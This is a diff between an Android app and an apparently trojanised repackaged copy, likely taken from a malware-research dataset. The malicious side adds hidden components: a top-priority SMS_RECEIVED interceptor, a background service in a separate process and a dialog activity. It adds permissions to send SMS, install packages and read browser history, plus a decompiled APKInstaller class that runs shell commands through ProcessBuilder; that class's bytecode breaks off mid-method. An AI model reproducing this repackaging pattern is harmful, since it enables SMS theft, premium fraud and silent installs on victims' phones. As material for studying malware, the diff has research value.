diff --git a/result/APP_47/App_B_47/AndroidManifest.xml b/result/APP_47/App_M_47/AndroidManifest.xml
index 3f0c300..52cc0f1 100755
--- a/result/APP_47/App_B_47/AndroidManifest.xml
+++ b/result/APP_47/App_M_47/AndroidManifest.xml
@@ -46,12 +46,29 @@
             </intent-filter>
         </receiver>
         <service android:name=".service.ScreenService"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
     </application>
     <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 </manifest>
\ No newline at end of file
diff --git a/result/APP_47/App_B_47/apktool.yml b/result/APP_47/App_M_47/apktool.yml
index 172f389..eec0e50 100755
--- a/result/APP_47/App_B_47/apktool.yml
+++ b/result/APP_47/App_M_47/apktool.yml
@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
diff --git a/result/APP_47/App_M_47/com/android/main/APKInstaller.java b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
new file mode 100755
index 0000000..bd0972b
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
@@ -0,0 +1,432 @@
+package com.android.main;
+
+public class APKInstaller
+{
+  public APKInstaller() {}
+  
+  /* Error */
+  public static String exec(String[] paramArrayOfString)
+  {
+    // Byte code:
+    //   0: ldc 17
+    //   2: astore 13
+    //   4: new 19	java/lang/ProcessBuilder
+    //   7: dup
+    //   8: aload_0
+    //   9: invokespecial 22	java/lang/ProcessBuilder:<init>	([Ljava/lang/String;)V
+    //   12: astore 21
+    //   14: aconst_null
+    //   15: astore 18
+    //   17: aconst_null
+    //   18: astore 19
+    //   20: aconst_null
+    //   21: astore 10
+    //   23: aconst_null
+    //   24: astore 16
+    //   26: aconst_null
+    //   27: astore 17
+    //   29: aconst_null
+    //   30: astore 11
+    //   32: aconst_null
+    //   33: astore 14
+    //   35: aconst_null
+    //   36: astore 15
+    //   38: aconst_null
+    //   39: astore 12
+    //   41: aload 11
+    //   43: astore 6
+    //   45: aload 12
+    //   47: astore 7
+    //   49: aload 10
+    //   51: astore 4
+    //   53: aload 16
+    //   55: astore 8
+    //   57: aload 14
+    //   59: astore 9
+    //   61: aload 18
+    //   63: astore 5
+    //   65: aload 17
+    //   67: astore_2
+    //   68: aload 15
+    //   70: astore_3
+    //   71: aload 19
+    //   73: astore_0
+    //   74: new 24	java/io/ByteArrayOutputStream
+    //   77: dup
+    //   78: invokespecial 25	java/io/ByteArrayOutputStream:<init>	()V
+    //   81: astore 20
+    //   83: aload 11
+    //   85: astore 6
+    //   87: aload 12
+    //   89: astore 7
+    //   91: aload 10
+    //   93: astore 4
+    //   95: aload 16
+    //   97: astore 8
+    //   99: aload 14
+    //   101: astore 9
+    //   103: aload 18
+    //   105: astore 5
+    //   107: aload 17
+    //   109: astore_2
+    //   110: aload 15
+    //   112: astore_3
+    //   113: aload 19
+    //   115: astore_0
+    //   116: aload 21
+    //   118: invokevirtual 29	java/lang/ProcessBuilder:start	()Ljava/lang/Process;
+    //   121: astore 10
+    //   123: aload 11
+    //   125: astore 6
+    //   127: aload 12
+    //   129: astore 7
+    //   131: aload 10
+    //   133: astore 4
+    //   135: aload 16
+    //   137: astore 8
+    //   139: aload 14
+    //   141: astore 9
+    //   143: aload 10
+    //   145: astore 5
+    //   147: aload 17
+    //   149: astore_2
+    //   150: aload 15
+    //   152: astore_3
+    //   153: aload 10
+    //   155: astore_0
+    //   156: aload 10
+    //   158: invokevirtual 35	java/lang/Process:getErrorStream	()Ljava/io/InputStream;
+    //   161: astore 11
+    //   163: aload 11
+    //   165: astore 6
+    //   167: aload 12
+    //   169: astore 7
+    //   171: aload 10
+    //   173: astore 4
+    //   175: aload 11
+    //   177: astore 8
+    //   179: aload 14
+    //   181: astore 9
+    //   183: aload 10
+    //   185: astore 5
+    //   187: aload 11
+    //   189: astore_2
+    //   190: aload 15
+    //   192: astore_3
+    //   193: aload 10
+    //   195: astore_0
+    //   196: aload 11
+    //   198: invokevirtual 41	java/io/InputStream:read	()I
+    //   201: istore_1
+    //   202: iload_1
+    //   203: iconst_m1
+    //   204: if_icmpne +209 -> 413
+    //   207: aload 11
